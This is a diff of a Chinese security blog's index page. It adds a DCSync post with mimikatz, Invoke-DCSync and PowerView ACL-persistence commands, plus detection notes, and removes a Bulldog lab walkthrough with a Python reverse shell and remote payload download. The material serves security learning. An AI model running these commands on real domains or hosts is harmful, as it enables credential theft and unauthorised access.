@@ -119,7 +119,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">49</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">52</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -129,7 +129,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">22</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">24</span></a>
 
   </li>
   </ul>
@@ -155,6 +155,224 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="swanQ">
+      <meta itemprop="description" content="Try & Enjoy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SwanQ's Blue SKY">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/" class="post-title-link" itemprop="url">域渗透提权维权之dcsync</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-07-08 10:20:47 / 修改时间：16:47:36" itemprop="dateCreated datePublished" datetime="2021-07-08T10:20:47+08:00">2021-07-08</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>2.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>DCSync是mimikatz的功能/命令。dcsync特点在于不用登录服务器，就可以<strong>远程通过域数据同步复制的方式模仿域控从真实的域控当中请求数据获得想要的用户hash</strong></p>
+<h1 id="0x02-dump-hash"><a href="#0x02-dump-hash" class="headerlink" title="0x02 dump hash"></a>0x02 dump hash</h1><h2 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h2><p>有以下任意用户权限即可：</p>
+<ul>
+<li>Domain Admins组内的用户</li>
+<li>Administrators组内的用户</li>
+<li>Enterprise Admins组内的用户</li>
+<li>域控制器的计算机帐户</li>
+</ul>
+<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控复制用户凭据 ？？</p>
+<p>实现代码：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L27">https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L27</a></p>
+<h2 id="维权方法："><a href="#维权方法：" class="headerlink" title="维权方法："></a>维权方法：</h2><ol>
+<li><p>mimikatz</p>
+<p>如上上篇博客所写</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导出所有用户hash</span></span><br><span class="line">lsadump::dcsync /domain:wlaq.com /all /csv</span><br><span class="line"><span class="comment">#导出administrator的hash</span></span><br><span class="line">lsadump::dcsync /domain:wlaq.com /user:administrator /csv</span><br></pre></td></tr></table></figure></li>
+<li><p>powershell(对2012及以上不适用)</p>
+<p>Invoke-DCSync:</p>
+<p>\使用mimikatz的dcsync来收集域用户的hash,通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能</p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/monoxgas/9d238accd969550136db">https://gist.github.com/monoxgas/9d238accd969550136db</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#先更改powershell的执行策略</span></span><br><span class="line"><span class="built_in">set-executionpolicy</span> bypass <span class="literal">-scope</span> <span class="keyword">process</span></span><br><span class="line"><span class="comment">#导出域内所有用户的hash：</span></span><br><span class="line"><span class="built_in">Invoke-DCSync</span> <span class="literal">-DumpForest</span> | <span class="built_in">ft</span> <span class="literal">-wrap</span> <span class="literal">-autosize</span></span><br><span class="line"><span class="comment">#导出域内administrator帐户的hash：</span></span><br><span class="line"><span class="built_in">Invoke-DCSync</span> <span class="literal">-DumpForest</span> <span class="literal">-Users</span> <span class="selector-tag">@</span>(<span class="string">&quot;administrator&quot;</span>) | <span class="built_in">ft</span> <span class="literal">-wrap</span> <span class="literal">-autosize</span> </span><br></pre></td></tr></table></figure>
+
+<p>powerview:</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L8270">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L8270</a></p>
+<p>利用powerview可向域内的一个普通用户添加如下三条ACE(Access Control Entries)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</span><br><span class="line">DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</span><br><span class="line">DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入powerview</span></span><br><span class="line"><span class="built_in">import-module</span> .\Powerview.ps1</span><br><span class="line"><span class="comment">#向普通用户test添加上面三条ACE-acess control entries</span></span><br><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;DC=wlaq,DC=com&quot;</span> <span class="literal">-PrincipalIdentity</span> test <span class="literal">-Rights</span> DCSync <span class="literal">-Verbose</span></span><br><span class="line"><span class="comment">#删除ACE命令</span></span><br><span class="line"><span class="built_in">Remove-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;DC=wlaq,DC=com&quot;</span> <span class="literal">-PrincipalIdentity</span> test <span class="literal">-Rights</span> DCSync <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/1.png"></p>
+<p>此时test用户即可利用DCSync来导出域内账户的hash,实现如下：</p>
+</li>
+</ol>
+<h2 id="利用powerview获取用户权限"><a href="#利用powerview获取用户权限" class="headerlink" title="利用powerview获取用户权限"></a>利用powerview获取用户权限</h2><p>利用powerview向域内普通账户swanq添加三个访问控制项</p>
+<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/1.png"></p>
+<p>使用runas登录swanq账户</p>
+<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/3.png"></p>
+<p>使用mimikatz dump hash:</p>
+<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/2.png"></p>
+<h1 id="0x03检测及清理"><a href="#0x03检测及清理" class="headerlink" title="0x03检测及清理"></a>0x03检测及清理</h1><h2 id="检测："><a href="#检测：" class="headerlink" title="检测："></a><strong>检测：</strong></h2><p>注意windows事件：4662.</p>
+<p>此时域成员与终端上都产生了两条ACE被添加的事件日志</p>
+<h2 id="清理："><a href="#清理：" class="headerlink" title="清理："></a><strong>清理：</strong></h2><p>使用zbang自动化检测当前环境是否遭受dcsync攻击：ACLight -&gt;launch</p>
+<p>ACLight可以检测出被添加DCSync权限的用户swanq</p>
+<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/4.png"></p>
+<h3 id="检测原理："><a href="#检测原理：" class="headerlink" title="检测原理："></a><strong>检测原理：</strong></h3><p><strong>枚举Active Directory中所有用户的ACL，标记出特权账户</strong></p>
+<p>如果已被攻击，powerview清除ACE,参考0x02部分内容</p>
+<h1 id="0x04总结"><a href="#0x04总结" class="headerlink" title="0x04总结"></a>0x04总结</h1><ol>
+<li><p>Shadow Admin：具有高权限但不在高权限组的用户，如实验中的域用户swanq，查询高权限组的成员无法发现域内的Shadow Admin,但是zbang可以发现。</p>
+</li>
+<li><p>ACL和ACE的区别：</p>
+<ul>
+<li>Access Control Lists访问控制列表：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-lists">https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-lists</a></li>
+<li>Access Control Entities访问控制项：访问控制列表 (ACL) 中的条目。 ACE 包含一组访问权限和安全标识符 (SID) ，后者标识允许、拒绝或审核其权限的账户或登录会话。<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-entries">https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-entries</a></li>
+</ul>
+<p>总结：ACL的多个ACE表示拥有不同访问权限的账户或登录会话。通过使用ACE的访问控制项来授予AD域服务中资源的访问权限</p>
+</li>
+<li><p>账户：</p>
+<ul>
+<li>用户账户可以登录到本机计算机</li>
+<li>组用户不可</li>
+</ul>
+</li>
+</ol>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
+<li>主要参考：<a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync</a></li>
+<li>附属：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/111686683">https://blog.csdn.net/qq_41874930/article/details/111686683</a></li>
+<li>工具：<a target="_blank" rel="noopener" href="https://github.com/cyberark/zBang/releases/tag/v1.1">https://github.com/cyberark/zBang/releases/tag/v1.1</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=aSAZzIqGeiY">https://www.youtube.com/watch?v=aSAZzIqGeiY</a></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/07/07/feeling-about-internship/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="swanQ">
+      <meta itemprop="description" content="Try & Enjoy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SwanQ's Blue SKY">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/07/07/feeling-about-internship/" class="post-title-link" itemprop="url">feeling about internship</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-07-07 18:14:40 / 修改时间：18:23:58" itemprop="dateCreated datePublished" datetime="2021-07-07T18:14:40+08:00">2021-07-07</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>127</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>听说，互联网公司兜兜转转的人很多</p>
+<p>听说，我现在呆的地方是君哥和帅哥曾经呆过的地方</p>
+<p>突然某日，他被挖了</p>
+<p>突然今日，他 也要走了</p>
+<p>无妨</p>
+<p>江湖路远，来日再见</p>
+<p>希望各位继续成长</p>
+<p>我也在逐渐向大家看齐</p>
+<p>希望等我长成与各位再见</p>
+<p>那就熟悉奇安信的安全建设从零到一</p>
+<p>那就熟悉各种原理及响应方式</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -190,7 +408,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-07-07 16:41:20" itemprop="dateModified" datetime="2021-07-07T16:41:20+08:00">2021-07-07</time>
+                <time title="修改时间：2021-07-08 09:16:25" itemprop="dateModified" datetime="2021-07-08T09:16:25+08:00">2021-07-08</time>
               </span>
 
           
@@ -259,9 +477,9 @@
 <p>概述：mimikatz功能，可模拟DC域控并从DC中导出帐户密码的hash</p>
 <p>详解：</p>
 <ul>
-<li><p>在dcsync出现之前，要想获得域用户的hash，必须得先登录域控+在域控上执行代码后才可以获得域用户的哈希。而mimikatz增加的dcsync功能，可以模仿域控从真实的域控当中请求数据。</p>
+<li><p>在dcsync出现之前，要想获得域用户的hash，必须得先登录域控+在域控上执行代码后才可以获得域用户的哈希。而mimikatz增加的dcsync功能，<strong>可以模仿域控从真实的域控当中请求数据</strong>。</p>
 </li>
-<li><p>dcsync特点在于不用登录服务器，就可以远程通过域数据同步复制的方式获得想要的用户口令。</p>
+<li><p>dcsync特点在于不用登录服务器，就可以<strong>远程通过域数据同步复制的方式获得想要的用户口令。</strong></p>
 </li>
 </ul>
 </blockquote>
@@ -1378,267 +1596,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/05/05/bulldog/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/author.jpg">
-      <meta itemprop="name" content="swanQ">
-      <meta itemprop="description" content="Try & Enjoy">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SwanQ's Blue SKY">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/05/05/bulldog/" class="post-title-link" itemprop="url">渗透测试之bulldog</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-05-05 20:44:04" itemprop="dateCreated datePublished" datetime="2021-05-05T20:44:04+08:00">2021-05-05</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-06 17:07:00" itemprop="dateModified" datetime="2021-05-06T17:07:00+08:00">2021-05-06</time>
-              </span>
-
-          
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>2.2k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今日突然冒出渗透靶机的想法，突然一看，前人早已栽好了树。</p>
-<p>每日分享：原来在孩提时期就已经看过余华的活着，只是当时读懂活着的人不是我。</p>
-<p>小狗拼命的想叫醒他的同伴，可他还不知道同伴可能再也醒不过来了</p>
-<p>每天都有人跟你一样在注视着生活中的点滴</p>
-<p>最后献上红楼的一句箴言：假亦真时真亦假，无为有处有还无</p>
-<p>不知道既喜欢红楼又喜欢昆曲，把后半辈子都献给教授外国人红楼梦的他，心境又是如何呢</p>
-<p>人生本来就是尝试的过程，正确与否在你以为</p>
-<p>也罢，继续写博客辽</p>
-<h1 id="0x01-资产收集"><a href="#0x01-资产收集" class="headerlink" title="0x01 资产收集"></a>0x01 资产收集</h1><p>靶机：Ubuntu16.04：192.168.127.134</p>
-<p>攻击机：kali 2021.1：192.168.127.133</p>
-<p>愣是想不起来这个命令叫啥：lsb_release -a</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 主机发现</span></span><br><span class="line"><span class="comment"># ping scan</span></span><br><span class="line">nmap -sn 192.168.127.0/24</span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口扫描</span></span><br><span class="line">masscan --rate=10000 --ports 0-65535 192.168.127.134</span><br><span class="line"></span><br><span class="line"><span class="comment"># 探究端口服务</span></span><br><span class="line">nmap -sV -T4 -O -p 23,80,8080 192.168.127.134</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/05/bulldog/1.png"></p>
-<p>可以看到python版本</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 扫描子域名</span></span><br><span class="line">dirb http://192.168.127.134</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/05/bulldog/2.png"></p>
-<p>去康康admin和dev分别是什么服务。访问admin会看到无验证码的登陆界面，而dev必须登陆之后才可以看到。</p>
-<p>dev页面有多个邮箱，去康康dev的源码，可能会md5加密的密码存储，一看还真有。解密之后尝试登陆admin页面，发现后两个账号可以登陆进去。不过账号是邮箱的前面，也就是姓名，登陆进去之后，发现dev界面的web shell也有了权限。其实这个界面类似于拿到一台被限制命令白名单的机子。尝试绕过吧。</p>
-<p><img src="/2021/05/05/bulldog/4.png"></p>
-<h1 id="0x02-漏洞检测"><a href="#0x02-漏洞检测" class="headerlink" title="0x02 漏洞检测"></a>0x02 漏洞检测</h1><p><strong>远程命令执行漏洞检测</strong>：</p>
-<p>使用;同时执行多个命令，被过滤；</p>
-<p>使用**&amp;,&amp;&amp;,|**同时执行多个命令,成功。</p>
-<p>查看敏感目录，发现3个用户：<br><img src="/2021/05/05/bulldog/3.png"></p>
-<h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><p>试试反弹shell：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在kali的/var/html/www目录下，搭建web服务</span></span><br><span class="line">python -m SimpleHTTPServer 80</span><br><span class="line"><span class="meta">#</span><span class="bash"> 攻击机监听1234端口</span></span><br><span class="line">nc -lvnp 1234</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机执行wget命令尝试连接</span></span><br><span class="line">pwd &amp; wget http://192.168.127.133</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机下载shell文件</span></span><br><span class="line">ls &amp; wget http://192.168.56.133/shell.py</span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机执行shell</span></span><br><span class="line">ls &amp; python shell.py</span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机删除shell</span></span><br><span class="line">ls &amp; rm -rf shell.py</span><br></pre></td></tr></table></figure>
-
-<p>其中反弹shell脚本shell.py内容如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment"># create an INET, STREAMing socket</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># now connect to the web server on port 1234</span></span><br><span class="line">s.connect((<span class="string">&quot;192.168.127.133&quot;</span>, <span class="number">1234</span>))</span><br><span class="line">os.dup(s.fileno(), <span class="number">0</span>)</span><br><span class="line">os.dup(s.fileno(), <span class="number">1</span>)</span><br><span class="line">os.dup(s.fileno(), <span class="number">2</span>)</span><br><span class="line">p = subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&#x27;-i&#x27;</span>])</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/2021/05/05/bulldog/5.png"></p>
-<p>进入home，查看其他用户:bulldogadmin  django</p>
-<p>进入bulldogadmin，查看所有文件，此时还是ls -la找到隐藏目录.hiddenadmindirectory。找到可执行文件customPermissionApp。<strong>strings</strong>查看其中字符</p>
-<p><img src="/2021/05/05/bulldog/6.png"></p>
-<p>猜测密码SUPERultimatePASSWORDyouCANTget。不过此处H到底代表什么暂时还不清楚。</p>
-<h1 id="0x04-提权-后门维持"><a href="#0x04-提权-后门维持" class="headerlink" title="0x04  提权/后门维持"></a>0x04  提权/后门维持</h1><p>此时无法提权，需要打开新终端</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开新终端</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="comment"># 提权</span></span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05  总结"></a>0x05  总结</h1><ol>
-<li><p>习惯查看网页源码以及查看bash下所有文件<strong>ls -la</strong></p>
-</li>
-<li><p>&amp;&amp;   &amp;    |的妙用</p>
-</li>
-<li><p>当cat查看某些文件出现乱码时，可以考虑用strings</p>
-</li>
-<li><p>一般反弹的shell不如终端，一般拿到后都先用python弹一个终端出来</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&quot;</span>/bin/bash<span class="string">&quot;)&quot;</span></span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure></li>
-<li><p>反弹shell过程</p>
-</li>
-<li><p>知识点总结：</p>
-<ul>
-<li><p>Python -m ：mod,run library module  as  a   script</p>
-</li>
-<li><p>SimpleHTTPServe：use Python SimpleHTTPServer to turn any directory into a simple HTTP web server.</p>
-</li>
-<li><p>python http服务器运行在80端口</p>
-</li>
-<li><p>nmap -sn：ping scan</p>
-</li>
-<li><p>masscan –rate=10000 –ports 0-65535 192.168.127.134：</p>
-<p>–rate=10000  意思是10kpps(packet per second)，每秒一万个数据包</p>
-</li>
-<li><p>wget：非交互式网络文件下载工具</p>
-</li>
-</ul>
-</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/29/%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E8%AE%B2%E5%BA%A7%E6%9C%89%E6%84%9F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/author.jpg">
-      <meta itemprop="name" content="swanQ">
-      <meta itemprop="description" content="Try & Enjoy">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SwanQ's Blue SKY">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/04/29/%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E8%AE%B2%E5%BA%A7%E6%9C%89%E6%84%9F/" class="post-title-link" itemprop="url">方滨兴院士讲座有感</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-04-29 09:54:26" itemprop="dateCreated datePublished" datetime="2021-04-29T09:54:26+08:00">2021-04-29</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-03 21:38:39" itemprop="dateModified" datetime="2021-05-03T21:38:39+08:00">2021-05-03</time>
-              </span>
-
-          
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>1.1k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="什么是六论视觉"><a href="#什么是六论视觉" class="headerlink" title="什么是六论视觉"></a>什么是六论视觉</h1><p>六论视觉：强弱是相对论,知识是认识论(敢闯无人区),失败是实践论,决策是矛盾论(多目标,化解矛盾才是最重要的),发展是进化论,管理是方法论(球不能停在自己脚下)</p>
-<p>网络安全人才的培养的六论视觉：能力是相对论,安全是认识论,攻防是实践论,选择是矛盾论,水平是进化论,鉴别是进化论.</p>
-<ol>
-<li>安全是认识论：<br>超过5000就构成犯罪。所以会用到靶场(类比少林弟子)。</li>
-</ol>
-<h1 id="人才培养"><a href="#人才培养" class="headerlink" title="人才培养"></a>人才培养</h1><p><strong>技能：知识(西电)+方法(方班)</strong></p>
-<ul>
-<li><p>知识：事实 常识 规则</p>
-</li>
-<li><p>方法：思辨 质疑 创新</p>
-<p>迅速适应企业的要求，迅速补上知识。自信的提升就是方法的提升。我觉得这么干是对的就是对的。美国一直行走在无人区。也要抬头看看是否真的无人，不怕走无人区，睁大眼睛可能有人做得比我好。</p>
-<p>思辨：如小萁所言，把查到得信息变为知识为思辨的过程。需要训练。思辨才是看难文章的敲门砖。你最会什么?你最懂的知道什么？把一件事思辨的搞明白。会思辨之后，再看顶会(挑战难度)。听完之后，迅速提炼自己的问题。保证心里有预期答案。为什么没按。不应该有答案，也是提高。特别坚信他是错的。每次讲完做总结。</p>
-</li>
-</ul>
-<h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><p>靶场：vulhub  pikachu  raven  sqli-lab</p>
-<p>内打内属于靶场(CTF)；内打外属于护网；外打外属于系统测试(方班演武堂)；外打内设备测试(大量人众测)。</p>
-<p>军队搞CTF赛很奇葩，每年参加CTF没什么意义(相当于奥赛其实，对于初学者)，为了比赛而比赛不可取，应该参与真正的实战。</p>
-<p>没有xss等。看的是逻辑漏洞，整个认证是在前端，认证应该在后端。改了应用程序，只看底层造成的。</p>
-<p>不要培养专职的CTF选手。仅限在学校</p>
-<h1 id="自我提高"><a href="#自我提高" class="headerlink" title="自我提高"></a>自我提高</h1><p><strong>最牛的要真的牛</strong></p>
-<h2 id="状态："><a href="#状态：" class="headerlink" title="状态："></a>状态：</h2><p>有一个做的特别深,便会知道怎么做.</p>
-<p>每天激情状态</p>
-<p>需要空闲期去考虑自己下一步要做什么，单目标函数还是双目标函数。</p>
-<p>喜欢理论支持博士，喜欢实践鼓励创业</p>
-<p>先去公司就业，积累资源、人脉，然后去创业。</p>
-<h2 id="目标："><a href="#目标：" class="headerlink" title="目标："></a>目标：</h2><p>靶场–&gt;对应的CTF赛题–&gt;实战、SRC。哪块弱补哪块。</p>
-<h2 id="安排："><a href="#安排：" class="headerlink" title="安排："></a>安排：</h2><ol>
-<li><strong>对于自己：各种靶场训练，然后实操。</strong></li>
